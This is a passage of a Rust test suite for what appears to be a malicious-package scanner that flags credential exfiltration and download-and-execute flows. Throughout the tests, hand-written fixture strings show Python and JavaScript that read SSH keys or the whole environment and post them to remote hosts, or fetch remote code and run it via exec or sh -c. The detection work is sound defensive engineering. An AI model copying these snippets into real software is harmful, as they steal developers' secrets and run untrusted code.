        assert_eq!(names("dist/logger.js", js), vec![CREDENTIAL_EXFIL]);
        // env-loader-cli (dev): secret directories walked, matches posted.
        let py = "_SCAN_DIRS = [os.path.join(_HOME, d) for d in ['.ssh', '.aws', '.kube']]\ndef report():\n    findings = []\n    for d in _SCAN_DIRS:\n        for root, dirs, files in os.walk(d):\n            for fn in files:\n                fp = os.path.join(root, fn)\n                with open(fp) as f:\n                    content = f.read()\n                findings.append({'value': content[:80]})\n    data = json.dumps({'findings': findings})\n    req = urllib.request.Request(wh, data=data.encode(), method='POST')\n    urllib.request.urlopen(req, timeout=5)\n";
        assert_eq!(names("env_loader/_core.py", py), vec![CREDENTIAL_EXFIL]);
        // A `.env` file is not a source, whoever sends what it holds (dotenv,
        // mcp-serper-search); nor is a public key path built with join.
        let own_key = "for candidate in [Path.cwd() / '.env']:\n    for line in candidate.read_text().splitlines():\n        if line.startswith('SERPER_API_KEY='):\n            api_key = line.split('=', 1)[1]\nresp = session.post(URL, headers={'X-API-KEY': api_key}, json=payload)\n";
        assert!(names("server.py", own_key).is_empty());
        let dotenv = "const envPath = path.resolve(process.cwd(), '.env');\nconst parsed = parse(fs.readFileSync(envPath));\nObject.assign(process.env, parsed);\nfetch(process.env.API_URL + '/health');\n";
        assert!(
            names("lib/main.js", dotenv).is_empty(),
            "{:?}",
            flows("lib/main.js", dotenv)
        );
        let mixed = "cfg = json.loads(urllib.request.urlopen(CONFIG).read())\nwh = cfg.get('webhook')\nkeys = open(os.path.join(home, '.ssh', 'id_rsa')).read()\nreq = urllib.request.Request(wh, data=keys.encode(), method='POST')\nurllib.request.urlopen(req)\n";
        assert_eq!(names("a.py", mixed), vec![CREDENTIAL_EXFIL]);
        let public = "key = open(os.path.join(home, '.ssh', 'id_ed25519.pub')).read()\nrequests.post(api + '/keys', json={'key': key})\n";
        assert!(names("deploy.py", public).is_empty());
    }

    #[test]
    fn a_call_of_a_function_that_returns_a_secret_carries_it() {
        let js = "function collect() {\n  const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\n  return { key };\n}\n\
                  fetch(URL, { method: 'POST', body: JSON.stringify(collect()) });\n";
        assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
        // What a function returns is followed one level (ansible-core).
        let two = "def docker_environment():\n    env = dict(os.environ)\n    return env\n\ndef podman_hostname():\n    out = raw_command(['podman', 'info'], env=docker_environment())\n    return out.strip()\n\nip = socket.gethostbyname(podman_hostname())\n";
        assert!(
            names("docker_util.py", two).is_empty(),
            "{:?}",
            flows("docker_util.py", two)
        );
    }

    /// A PyPI batch of 2026-11: a helper returns what it downloaded and the
    /// caller runs it in this process. Written by hand, not copied.
    #[test]
    fn a_download_returned_by_a_helper_counts_only_in_process() {
        let helper = "import urllib.request\ndef _transfer(url):\n    with urllib.request.urlopen(url, timeout=30) as resp:\n        payload = resp.read()\n    return payload\n\n";
        for (path, src) in [
            ("a.py", format!("{helper}def launch(url):\n    source = _transfer(url)\n    exec(compile(source, '<remote>', 'exec'), {{'__name__': '__main__'}})\n")),
            ("b.py", format!("{helper}def launch():\n    payload = _transfer('https://cdn.example/x.py')\n    exec(payload.decode())\n")),
            ("c.py", "def api_json(path):\n    return requests.get('https://cdn.example/api/' + path).json()\n\ndef run():\n    r = api_json('stage')\n    data = zlib.decompress(base64.b64decode(r['payload']))\n    exec(data)\n".to_string()),
            ("d.py", "def _fetch_remote():\n    u = 'https://cdn.example/gh/x/y/z.py'\n    return requests.get(u).text\n\ndef main():\n    code = _fetch_remote()\n    exec(code, globals())\n".to_string()),
            ("e.py", "def _load():\n    try:\n        return requests.get('https://cdn.example/x.bin').content\n    except Exception:\n        return EMBEDDED\n\nsrc = _decrypt(_load(), KEY)\nexec(src)\n".to_string()),
            ("f.py", "def stage():\n    r = requests.get(URL)\n    return r.text\n\nexec(stage())\n".to_string()),
            ("g.js", "async function load() {\n  const r = await fetch('https://cdn.example/x.js');\n  return r.text();\n}\nconst code = await load();\nnew Function(code)();\n".to_string()),
        ] {
            assert_eq!(names(path, &src), vec![DOWNLOAD_EXECUTE], "{path}");
        }
        // setuptools' `download_svn(url)` and a `curl` wrapper hand what they
        // fetched to a program; a caller that saves or parses it runs nothing.
        for (path, src) in [
            ("a.py", format!("{helper}def unpack(url):\n    target = _transfer(url)\n    os.system('svn checkout -q %s %s' % (url, target))\n    subprocess.check_call(['tar', 'xf', target], shell=True)\n")),
            ("b.py", "def cco(*args):\n    return subprocess.check_output(['curl', '-s', *args])\n\nout = cco('https://cdn.example/x.sh')\nsubprocess.check_call(out, shell=True)\nos.system(cco('https://cdn.example/y.sh'))\n".to_string()),
            ("c.py", format!("{helper}data = _transfer('https://cdn.example/x.py')\nwith open('x.py', 'wb') as f:\n    f.write(data)\ncfg = json.loads(_transfer(URL))\nprint(cfg['name'])\n")),
            ("d.js", "async function load() {\n  return (await fetch('https://cdn.example/x.sh')).text();\n}\nconst script = await load();\nexecSync(script);\nspawn('sh', ['-c', script]);\n".to_string()),
            // A loader written for a remote host and sent over SSH.
            ("e.py", "def auth():\n    return requests.post(URL, json=body).json()\n\ndef remote(target):\n    encoded = base64.b64encode(auth()['script'].encode()).decode()\n    runner = f\"import base64; exec(base64.b64decode({encoded!r}))\"\n    ssh(target, runner)\n".to_string()),
        ] {
            assert!(names(path, &src).is_empty(), "{path}: {:?}", flows(path, &src));
        }
    }

    #[test]
    fn wrappers_in_ordinary_code_have_no_flow() {
        // One variable of the environment, a logger, an environment for a
        // child process, and a method of another object with the same name.
        let js = "function post(url, body) {\n  return fetch(url, { method: 'POST', body: JSON.stringify(body) });\n}\n\
                  function log(msg) {\n  console.log(msg);\n}\nfunction env() {\n  return { ...process.env, CI: '1' };\n}\n\
                  post(api, { token: process.env.TOKEN });\nlog(process.env);\nconst child = spawn('npm', ['test'], { env: env() });\n\
                  socket.post(process.env);\nfetch(status);\n";
        assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
        // opencode-token-usage: the environment handed to a function that
        // reads two variables of it.
        let picks = "async function token(auth, env) {\n  return fetch(URL, { method: 'POST', body: JSON.stringify({ id: env.CLIENT_ID, secret: env['CLIENT_SECRET'] }) });\n}\nconst env = process.env;\nawait token(auth, env);\nawait fetch(API, { headers: { auth: env.TOKEN } });\n";
        assert!(
            names("usage.js", picks).is_empty(),
            "{:?}",
            flows("usage.js", picks)
        );
        let default = "async function load(paths, state = {}, env = process.env) {\n  const r = await fetch(API, { headers: { auth: env.TOKEN } });\n  await post(env);\n}\n";
        assert!(
            names("usage.js", default).is_empty(),
            "{:?}",
            flows("usage.js", default)
        );
        // A callback as a default value used to end the header there and
        // bind the next parameter to the environment.
        let arrow = "async function chat({ model, onText = () => {}, maxOutputTokens = 8192, env = process.env }) {\n  const body = { max: maxOutputTokens };\n  await fetch(u, { method: 'POST', body: JSON.stringify(body) });\n}\n";
        assert!(
            names("chat.js", arrow).is_empty(),
            "{:?}",
            flows("chat.js", arrow)
        );
        let parens = "function run(opts, now = Date.now(), env = process.env) {\n}\n";
        assert_eq!(
            statements(parens, false).1[0].params,
            ["opts", "now", "env"]
        );
        // A callback among the arguments of a call is still a block.
        let callback = "async function chat({ onText = () => {}, env = process.env }) {\n  queue.run(1, async () => {\n    const all = process.env;\n    await fetch(u, { method: 'POST', body: JSON.stringify(all) });\n  });\n}\n";
        assert_eq!(names("chat.js", callback), vec![CREDENTIAL_EXFIL]);
        let py = "def send(data):\n    requests.post(URL, json=data)\n\ndef debug(data):\n    print(data)\n\n\
                  send({'user': os.environ.get('USER')})\ndebug(os.environ)\n";
        assert!(names("a.py", py).is_empty(), "{:?}", flows("a.py", py));
    }

    /// Shapes from new npm and PyPI releases the watch flagged (2026-11-20):
    /// the environment read for one setting, through a helper or a copy.
    #[test]
    fn settings_read_from_the_environment_are_not_the_environment() {
        for (path, src) in [
            ("skill-stubs.js", "const env = options.env ?? process.env;\nconst backend = options.backend ?? edgeBackendBase(env);\nconst response = await fetch(`${backend}/${route}`, { method: 'POST' });\n"),
            ("task-hook.mjs", "const res = await fetch(`http://127.0.0.1:${portOf(process.env)}/api/tasks/digest`, { method: 'POST' });\n"),
            ("minimax.js", "const fromEnv = typeof process.env?.MINIMAX_GROUP_ID === 'string' ? process.env.MINIMAX_GROUP_ID.trim() : '';\nconst response = await fetch(endpointFor(base, fromEnv), { method: 'POST' });\n"),
            ("transport.js", "const factoryContext = {\n  env: process.env,\n  cwd,\n};\nreturn fetch(endpointFactory ? endpointFactory(factoryContext) : location, { method: 'POST' });\n"),
            ("proxy_cli.py", "env = read_env(text) if path else dict(os.environ)\nendpoint = endpoint or env.get(base_env) or None\nreq = urllib.request.Request(endpoint, method='POST')\nurllib.request.urlopen(req, timeout=20)\n"),
            ("webhooks.py", "slug = hub_slug(hub_dir, os.environ)\n\n@router.post('/webhooks/' + slug + '/{name}')\nasync def receive(name, request):\n    pass\n"),
            // An update check: a script for another process, a version number.
            ("update.js", "const script = `fetch(${JSON.stringify(REGISTRY_URL)}).then((r) => r.json())`;\nspawn(process.execPath, ['-e', script], { detached: true });\n"),
            ("finish.mjs", "const r = await fetch('https://registry.npmjs.org/x/latest');\nconst version = (await r.json()).version;\nspawnSync('npx', ['-y', `x@${version}`, ...args], { stdio: 'inherit' });\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src).iter().map(|m| &m.context).collect::<Vec<_>>());
        }
        // A helper of the file that returns what it collected from its
        // argument keeps the value; one that reads a setting does not.
        let collect = "function secrets(env) {\n  const found = [];\n  for (const [name, value] of Object.entries(env)) {\n    if (/KEY|TOKEN/.test(name)) found.push(value);\n  }\n  return found;\n}\nconst values = secrets(process.env);\nfetch(u, { method: 'POST', body: JSON.stringify(values) });\n";
        assert_eq!(names("g.js", collect), vec![CREDENTIAL_EXFIL]);
        // The whole of it, serialised or handed over, still is.
        for (path, src) in [
            ("a.js", "fetch(u, { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("b.js", "const env = process.env;\nawait axios.post(u, env);\n"),
            ("c.js", "const data = { env: process.env, host };\nfetch(u, { method: 'POST', body: JSON.stringify(data) });\n"),
            ("d.py", "requests.post(u, json=dict(os.environ))\n"),
            ("e.py", "found = {}\nfor name, value in os.environ.items():\n    found[name] = value\nrequests.post(u, json=found)\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
        let run = "const code = await (await fetch(u)).text();\nspawn('node', ['-e', code]);\n";
        assert_eq!(names("f.js", run), vec![DOWNLOAD_EXECUTE]);
    }

    /// Shapes from the releases of 2026-11-21, one test per narrowing.
    #[test]
    fn a_call_through_a_subscript_is_a_call() {
        let py = "client = httpx.Client()\nenv = os.environ\nheaders = PROVIDERS[provider](env)\nclient.post(listing, headers=headers)\n";
        assert!(
            names("models.py", py).is_empty(),
            "{:?}",
            flows("models.py", py)
        );
        let js = "const headers = PROVIDERS[provider](process.env);\nawait fetch(listing, { method: 'POST', headers });\n";
        assert!(
            names("models.js", js).is_empty(),
            "{:?}",
            flows("models.js", js)
        );
        let copy = "env = (os.environ)\nrequests.post(u, json=dict(env))\n";
        assert_eq!(names("a.py", copy), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn a_field_of_a_group_and_a_called_name_are_not_the_environment() {
        for (path, src) in [
            ("a.py", "key = (os.environ if environ is None else environ).get(k)\nrequests.post(u, json={'k': key})\n"),
            ("b.js", "const name = (options.env ?? process.env).NAME;\nfetch(u, { method: 'POST', body: JSON.stringify({ name }) });\n"),
            ("c.js", "export const configDir = (env = process.env) => configRoot(env);\nconst dir = configDir();\nfetch(u, { method: 'POST', body: JSON.stringify({ dir, again: configDir() }) });\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
        }
        for (path, src) in [
            ("d.py", "env = (os.environ if environ is None else environ)\nrequests.post(u, json=dict(env))\n"),
            ("e.js", "const env = (options.env ?? process.env);\nfetch(u, { method: 'POST', body: JSON.stringify(env) });\n"),
            ("f.js", "fetch(u, { method: 'POST', body: JSON.stringify(Object.entries(options.env ?? process.env).map(([k, v]) => k + v)) });\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
    }

    #[test]
    fn a_method_sink_needs_a_network_client() {
        let queue = "env = dict(os.environ)\n_QUEUE.put(env)\nprocess.put(json.dumps(env))\n";
        assert!(
            names("worker.py", queue).is_empty(),
            "{:?}",
            flows("worker.py", queue)
        );
        let streams = "const req = http.request(o);\nreq.end();\nprocess.stdout.write(JSON.stringify(process.env));\nres.end(JSON.stringify(process.env));\nlog.write(JSON.stringify(process.env));\n";
        assert!(
            names("debug.js", streams).is_empty(),
            "{:?}",
            flows("debug.js", streams)
        );
        for (path, src) in [
            ("a.js", "const req = https.request(o);\nreq.write(JSON.stringify(process.env));\nreq.end();\n"),
            ("b.js", "https.request(o, () => {})\n  .end(JSON.stringify(process.env));\n"),
            ("c.js", "const sock = new net.Socket();\nsock.connect(443, HOST, () => sock.write(JSON.stringify(process.env)));\n"),
            ("d.py", "session = requests.Session()\nsession.post(u, json=dict(os.environ))\n"),
            ("e.py", "class C:\n    def __init__(self):\n        self.http = httpx.Client()\n\n    def send(self):\n        self.http.put(u, json=dict(os.environ))\n"),
            ("f.py", "async with aiohttp.ClientSession() as s:\n    await s.post(u, json=dict(os.environ))\n"),
            ("g.py", "import requests as r\nr.post(u, json=dict(os.environ))\n"),
            ("h.py", "conn = http.client.HTTPSConnection(HOST)\nconn.request('POST', '/', json.dumps(dict(os.environ)))\n"),
            ("i.py", "httpx.post(u, json=dict(os.environ))\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
    }

    #[test]
    fn the_environment_of_a_child_process_is_not_in_its_result() {
        for (path, src) in [
            ("a.py", "proc = subprocess.run(cmd, env={**os.environ, **(env or {})})\nrequests.post(u, json={'out': proc.stdout})\n"),
            ("b.py", "proc = subprocess.run(cmd, env={**{k: v for k, v in os.environ.items()}, **(env or {})}, check=True)\nrequests.post(u, json={'out': proc.stdout})\n"),
            ("c.py", "base = {k: v for k, v in os.environ.items()}\nproc = subprocess.Popen(cmd, env={**base, **(extra or {})})\nrequests.post(u, json={'pid': proc.pid})\n"),
            ("d.js", "const child = spawn(cmd, args, { env: { ...Object.fromEntries(Object.entries(process.env).filter(keep)), ...(extra || {}) }, stdio: 'pipe' });\nfetch(u, { method: 'POST', body: JSON.stringify({ pid: child.pid }) });\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
        }
        let copy = "d = dict(os.environ)\nrequests.post(u, json=d)\n";
        assert_eq!(names("e.py", copy), vec![CREDENTIAL_EXFIL]);
        // What stands around the argument is still read.
        let curl = "r = subprocess.run(['curl', '-s', URL], env={**os.environ, **(env or {})}, capture_output=True)\nsubprocess.run(['node', '-e', r.stdout])\n";
        assert_eq!(names("f.py", curl), vec![DOWNLOAD_EXECUTE]);
        let input = "r = subprocess.run(cmd, env={**base, **(env or {})}, input=json.dumps(dict(os.environ)))\nrequests.post(u, data=r.stdout)\n";
        assert_eq!(names("g.py", input), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn a_name_given_a_new_value_is_clean_again() {
        let py = "def start(self):\n    env = {**os.environ, 'T': t}\n    subprocess.Popen(cmd, env=env)\n\ndef send(self, obj):\n    env = pool.build_envelope(obj)\n    sock.sendall(json.dumps(env))\n";
        assert!(
            names("pool.py", py).is_empty(),
            "{:?}",
            flows("pool.py", py)
        );
        let js = "const env = { ...process.env, CI: '1' };\nspawn('npm', ['test'], { env });\nfunction send(msg) {\n  const env = envelope(msg);\n  fetch(u, { method: 'POST', body: JSON.stringify(env) });\n}\n";
        assert!(
            names("pool.js", js).is_empty(),
            "{:?}",
            flows("pool.js", js)
        );
        // Derived from itself or from another tainted name, added to, or
        // changed in place: still the value.
        for (path, src) in [
            ("a.py", "env = dict(os.environ)\nenv = json.dumps(env)\nrequests.post(u, data=env)\n"),
            ("b.py", "env = os.environ\nenv = scrub(env)\nrequests.post(u, json=dict(env))\n"),
            ("c.py", "data = {}\ndata = dict(os.environ)\nrequests.post(u, json=data)\n"),
            ("d.py", "body = ''\nbody += json.dumps(dict(os.environ))\nbody += '\\n'\nrequests.post(u, data=body)\n"),
            ("e.py", "d = dict(os.environ)\nd['host'] = name\nd.update(extra)\nrequests.post(u, json=d)\n"),
            ("f.js", "let data = JSON.stringify(process.env);\nconst key = makeKey();\ndata = encrypt(data, key);\nfetch(u, { method: 'POST', body: data });\n"),
            ("g.js", "function send(data) {\n  data = pack(data);\n  fetch(u, { method: 'POST', body: data });\n}\nsend(process.env);\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
    }

    #[test]
    fn a_request_to_a_loopback_url_is_local() {
        for (path, src) in [
            ("a.js", "await fetch('http://127.0.0.1:4317/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("b.js", "await axios.post(`http://localhost:${port}/hook`, process.env);\n"),
            ("c.py", "requests.post(f\"http://[::1]:{port}/x\", json=dict(os.environ))\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
        }
        for (path, src) in [
            ("d.js", "await fetch('http://203.0.113.5:4317/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("e.js", "const hook = 'http://127.0.0.1:4317/hook';\nawait fetch(hook, { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("f.js", "await fetch('http://localhost.example.net/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
            ("g.py", "requests.post('http://127.0.0.1:80@example.net/x', json=dict(os.environ))\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
    }

    #[test]
    fn a_public_key_or_the_ssh_config_is_not_a_secret() {
        for (path, src) in [
            ("a.py", "ssh_dir = os.path.join(home, \".ssh\")\nkey = os.path.join(ssh_dir, \"id_ed25519\")\nsubprocess.run([\"ssh-keygen\", \"-f\", key])\npub = open(key + \".pub\").read()\nrequests.post(api, json={\"key\": pub})\n"),
            ("b.js", "const sshDir = path.join(os.homedir(), '.ssh');\nconst pub = fs.readFileSync(path.join(sshDir, 'id_ed25519.pub'), 'utf8');\nfetch(api, { method: 'POST', body: JSON.stringify({ pub }) });\n"),
            ("c.py", "cfg = open(os.path.join(home, \".ssh\", \"config\")).read()\nrequests.post(api, json={\"hosts\": cfg})\n"),
            ("d.py", "cfg = open(os.path.expanduser(\"~/.ssh/config\")).read()\nrequests.post(api, json={\"hosts\": cfg})\n"),
            ("e.py", "ssh = Path.home() / \".ssh\"\nhosts = (ssh / \"known_hosts\").read_text()\nrequests.post(api, json={\"hosts\": hosts})\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
        }
        for (path, src) in [
            ("f.py", "d = os.path.join(home, \".ssh\")\ndata = {}\nfor f in os.listdir(d):\n    data[f] = open(os.path.join(d, f)).read()\nrequests.post(u, json=data)\n"),
            ("g.py", "d = os.path.join(home, \".ssh\")\ndata = {f: open(os.path.join(d, f)).read() for f in os.listdir(d) if f not in (\"config\", \"known_hosts\")}\nrequests.post(u, json={\"config\": cfg, \"keys\": data})\n"),
            ("h.js", "const dir = path.join(os.homedir(), '.ssh');\nconst key = fs.readFileSync(path.join(dir, 'id_ed25519'), 'utf8');\nfetch(u, { method: 'POST', body: key });\n"),
            ("i.py", "for name in [\"id_rsa\", \"id_rsa.pub\", \"config\"]:\n    found[name] = open(os.path.join(home, \".ssh\", name)).read()\nrequests.post(u, json=found)\n"),
        ] {
            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
        }
    }

    #[test]
    fn a_status_an_option_or_a_version_is_not_downloaded_code() {
        for (path, src) in [
            // The status of a response, not its body.
            ("a.js", "const r = await fetch(u);\nconst up = r.status < 500;\nexecSync(up ? 'service x reload' : 'service x restart');\n"),
            ("b.js", "const ok = (await fetch(u)).ok;\nexecSync(ok ? 'true' : 'false');\n"),
            ("c.py", "r = requests.get(u)\nalive = r.status_code == 200\nos.system('start' if alive else 'stop')\n"),
            // Data for the process, not its command.
            ("d.js", "const body = await (await fetch(u)).text();\nspawnSync('python3', ['-c', PARSER], { input: body, encoding: 'utf8' });\n"),
            ("e.py", "r = requests.get(u)\nsubprocess.run(['python3', '-c', PARSER], input=r.text)\n"),
            // A self-update.
            ("f.js", "const latest = (await (await fetch(REG)).json()).version;\nspawnSync('npm', ['install', '-g', `pkg@${latest}`], { shell: true });\n"),
            ("g.js", "const latest = (await (await fetch(REG)).json()).version;\nexecSync(`npm install -g pkg@${latest}`);\n"),
            ("h.py", "v = requests.get(PYPI).json()['info']['version']\nsubprocess.run(f'pip install pkg=={v}', shell=True)\n"),
        ] {
            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
        }
        for (path, src) in [
            ("i.js", "const data = await (await fetch(u)).json();\nspawn('sh', ['-c', data.command]);\n"),
            ("j.js", "const r = await fetch(u);\nconst body = r.status === 200 ? await r.text() : '';\nexecSync(body);\n"),
            ("k.py", "resp = requests.get(u)\nexec(resp.text)\n"),
            ("l.js", "const code = await (await fetch(u)).text();\nnew Function(code)();\n"),
            ("m.js", "const body = await (await fetch(u)).text();\nspawnSync('sh', ['-c', body], { stdio: 'inherit' });\n"),
            ("n.py", "r = requests.get(u)\nsubprocess.run(args=r.text, shell=True)\n"),
            ("o.js", "const data = await (await fetch(u)).json();\nspawnSync('npm', ['install', data.pkg], { shell: true });\n"),
        ] {
            assert_eq!(names(path, src), vec![DOWNLOAD_EXECUTE], "{path}");
        }
    }

    /// The clean packages the first version flagged (playwright,
    /// vscode-tailwindcss, delta-core, tvsd).
    #[test]
    fn clean_package_shapes_have_no_flow() {
        let ipc = "function start() {\n  const child = fork(server, [], { env: { ...process.env, PORT } });\n  child.send({ type: 'ready' });\n  res.send(body);\n}\n";
        assert!(names("dist/server.js", ipc).is_empty());
        let backward =
            "def run():\n    exec(code)\n\ndef fetch_code():\n    code = requests.get(URL).text\n";
        assert!(names("orchestrator.py", backward).is_empty());
        let scrape = "request = requests.get(search_url, params={'q': q})\nresults = list(eval(str(request.content, 'utf-8-sig')))\n";
        assert!(names("sources/x.py", scrape).is_empty());
        // todo-tree, pm2: running curl / wget is not running what they fetch.
        let fetch_tool = "execSync('curl -sL https://x.example/codicons.css -o codicons.css');\nspawn('wget', [url, '-O', dest]);\n";
        assert!(names("buildCodiconNames.js", fetch_tool).is_empty());
        // ckan-cloud-operator: a curl command line kept in a variable.
        let command = "cmd = f'curl -f -s --header \"PRIVATE-TOKEN: {t}\" https://gitlab.com/api/v4/{u} > {name}'\nsubprocess.check_call(cmd, shell=True)\n";
        assert!(names("gitlab.py", command).is_empty());
        // next: named variables picked out of the environment.
        let picked = "const { NEXT_TRACE_UPLOAD_DEBUG, NEXT_TRACE_UPLOAD_FULL } = process.env;\nawait fetch(url, { body: JSON.stringify({ full: NEXT_TRACE_UPLOAD_FULL }) });\n";
        assert!(names("trace-uploader.js", picked).is_empty());
        // Random packages drawn for ruleset 2026.11.8: a mocked environment
        // (django-cronman), a server started with it (nbclassic), a public
        // key sent to be signed (unskript).
        let mocked = "@mock.patch(\"cronman.utils.os.environ\", {\"X\": \"1\"})\ndef test_x(self):\n    pass\n";
        assert!(names("tests/test_utils.py", mocked).is_empty());
        let server = "env = os.environ.copy()\ninfo['popen'] = Popen(command, cwd=nbdir, env=env)\nrequests.post(urljoin(info['url'], 'api/shutdown'))\n";
        assert!(names("conftest.py", server).is_empty());
        let public = "pub = os.environ.get('HOME') + '/.ssh/id_rsa.pub'\nwith open(pub) as f:\n    key = f.readlines()\nrequests.post(vault_url, json={'public_key': key[0]})\n";
        assert!(names("ssh.py", public).is_empty());
        let private = public.replace("id_rsa.pub", "id_rsa");
        assert_eq!(names("ssh.py", &private), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn ordinary_code_has_no_flow() {
        let py = r#"import os, subprocess, requests, re
env = os.environ.copy()
env["X"] = "1"
subprocess.run(cmd, env=env)
requests.post(url, json={"token": os.environ.get("TOKEN")})
exec(open("version.py").read())
r = requests.get(url)
version = re.compile(r"v(\d+)").match(r.text)
print("send os.environ to the server")  # data = os.environ
"#;
        assert!(
            names("setup.py", py).is_empty(),
            "{:?}",
            flows("setup.py", py)
        );
        let js = "const { spawn } = require('child_process');\nconst child = spawn('npm', ['test'], { env: { ...process.env, CI: '1' } });\nconst text = await (await fetch(u)).text();\nconst m = /x(\\d+)/.exec(text);\nfetch(api, { headers: { auth: process.env.TOKEN } });\n";
        assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
    }

    /// Both callers of `trailing_name`: the receiver of a method and the
    /// callee around a value, each right after a three-byte character.
    #[test]
    fn multibyte_char_before_a_name_is_not_sliced_into() {
        let py = "import os, requests\nsecret = os.environ\nx = 1；requests.post(\"http://198.51.100.23/x\", data=secret)\n";
        assert_eq!(names("a.py", py), [CREDENTIAL_EXFIL]);
        let js = "const t = process.env.NPM_TOKEN;\nconst x = 1；wrap(t);\n";
        assert!(names("a.js", js).is_empty());
    }

    /// `cross_file` over files held in memory: (file, line, context).
    fn crossing(files: &[(&str, &str)]) -> Vec<(String, usize, String)> {
        let paths: Vec<&str> = files.iter().map(|(path, _)| *path).collect();
        let read = |path: &str| {
            let file = files.iter().find(|(p, _)| *p == path);
            file.map(|(_, src)| src.to_string())
        };
        cross_file(&paths, read)
            .into_iter()
            .map(|m| {
                assert_eq!(m.matched_pattern, CREDENTIAL_EXFIL);
                (m.file_path, m.line_number, m.context)
            })
            .collect()
    }

    #[test]
    fn a_file_is_summarised_for_others_only_with_a_source_or_a_sink() {
        for (path, src, expected) in [
            ("config.js", "module.exports = { port: process.env.PORT, host: process.env['HOST'] };\n", (false, false)),
            ("env.js", "const child = { ...process.env, CI: '1' };\n", (true, false)),
            ("keys.py", "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nport = os.environ.get('PORT')\n", (true, false)),
            ("api.js", "const r = await fetch(base + '/health');\n", (false, true)),
            ("raw.js", "const req = https.request(opts);\nreq.write(body);\n", (false, true)),
            ("log.js", "process.stdout.write(text);\n", (false, false)),
            ("notes.txt", "fetch(u, { body: JSON.stringify(process.env) })\n", (false, false)),
        ] {
            assert_eq!(reads_and_sends(path, src), expected, "{path}");
        }
    }

    const COLLECT_JS: &str = "const fs = require('fs');\nfunction all() {\n  return { env: process.env, key: fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8') };\n}\nmodule.exports = { all };\n";
    const COLLECT_PY: &str =
        "import os\n\ndef grab():\n    found = dict(os.environ)\n    return found\n";

    #[test]
    fn a_secret_returned_by_an_imported_function_reaches_a_sink() {
        let collect = ("lib/collect.js", COLLECT_JS);
        for (path, src, line) in [
            ("index.js", "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n", 2),
            ("index.js", "const { all: grab } = require('./lib/collect.js');\nconst data = grab();\nfetch(URL, { method: 'POST', body: JSON.stringify(data) });\n", 3),
            ("index.js", "const all = require('./lib/collect').all;\naxios.post(URL, all());\n", 2),
            ("index.mjs", "import { all as grab } from './lib/collect.js';\nawait fetch(URL, { method: 'POST', body: JSON.stringify(grab()) });\n", 2),
            ("src/main.ts", "import * as c from '../lib/collect';\nasync function run() {\n  const data = c.all();\n  await fetch(URL, { method: 'POST', body: JSON.stringify(data) });\n}\n", 4),
            ("src/main.ts", "import c from '../lib/collect';\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n", 2),
            // TypeScript's output.
            ("dist/index.js", "const collect_1 = require(\"../lib/collect\");\nconst data = (0, collect_1.all)();\nfetch(URL, { method: 'POST', body: JSON.stringify(data) });\n", 3),
            // A wrapper of this file around the sink.
            ("index.js", "const c = require('./lib/collect');\nfunction send(body) {\n  return fetch(URL, { method: 'POST', body });\n}\nsend(JSON.stringify(c.all()));\n", 5),
        ] {
            let found = crossing(&[collect, (path, src)]);
            assert_eq!(found.len(), 1, "{path}: {found:?}");
            assert_eq!((found[0].0.as_str(), found[0].1), (path, line), "{src}");
            assert!(
                found[0].2.contains("process.env in lib/collect.js (line 3)"),
                "{}",
                found[0].2
            );
        }
        // A directory's `index`.
        let index = [
            ("lib/collect/index.js", COLLECT_JS),
            ("main.js", "const c = require('./lib/collect');\nfetch(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
        ];
        assert_eq!(crossing(&index).len(), 1);
        // A comment inside the names is no cover: it is gone where the walk
        // looks, and where `reads_and_sends` does.
        let split = [
            ("lib/collect.js", "function all() {\n  return { env: process/**/.env };\n}\nmodule.exports = { all };\n"),
            ("main.js", "const c = require('./lib/collect');\nfetch/**/(URL, { method: 'POST', body: JSON.stringify(c.all()) });\n"),
        ];
        assert_eq!(crossing(&split).len(), 1);
    }

    #[test]
    fn a_secret_returned_by_an_imported_python_function_reaches_a_sink() {
        for (path, src) in [
            ("pkg/__init__.py", "import requests\nfrom .collect import grab\nrequests.post(URL, json=grab())\n"),
            ("pkg/__init__.py", "import requests\nfrom . import collect\ndata = collect.grab()\nrequests.post(URL, json=data)\n"),
            ("pkg/sub/run.py", "import requests\nfrom ..collect import (\n    grab as g,\n)\nrequests.post(URL, json=g())\n"),
            ("pkg/main.py", "import requests\nimport collect as c\nrequests.post(URL, json=c.grab())\n"),
            ("setup.py", "import requests\nfrom pkg.collect import grab\nrequests.post(URL, json=grab())\n"),
            ("setup.py", "import requests\nimport pkg.collect\nrequests.post(URL, json=pkg.collect.grab())\n"),
